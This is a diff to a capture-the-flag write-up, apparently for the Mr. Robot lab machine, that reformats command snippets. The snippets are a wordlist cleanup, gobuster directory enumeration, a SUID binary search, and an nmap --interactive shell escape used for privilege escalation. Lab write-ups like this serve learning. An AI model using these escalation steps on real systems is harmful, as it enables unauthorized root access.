@@ -15,7 +15,7 @@ We find the first key and dictionary, let's download it!
 
 The dict contains many duplicates we can remove that by using this command
 
-bash``<br>cat fsocity.dic | tee | sort | uniq > pass.txt<br>
+```cat fsocity.dic | tee | sort | uniq > pass.txt```
 
 Let's run gobuster and see what hidden directories site has
 <img width="1114" height="198" alt="Screenshot From 2026-01-01 19-05-24" src="https://github.com/user-attachments/assets/e320cf92-545f-4969-8aec-0a2dac056b20" />
@@ -64,8 +64,8 @@ bash``<br>find / -perm -4000 -type f 2>/dev/null<br>
 
 Then we need to check each binary in GTFObins, and we can use nmap binary to escalate our priveleges
 
-nmap --interactive
-nmap> !sh
+```nmap --interactive```
+```nmap> !sh```
 
 <img width="1488" height="137" alt="Screenshot From 2026-01-01 19-46-44" src="https://github.com/user-attachments/assets/d719eb30-0a54-430e-9182-26ae8680bdf3" />
 
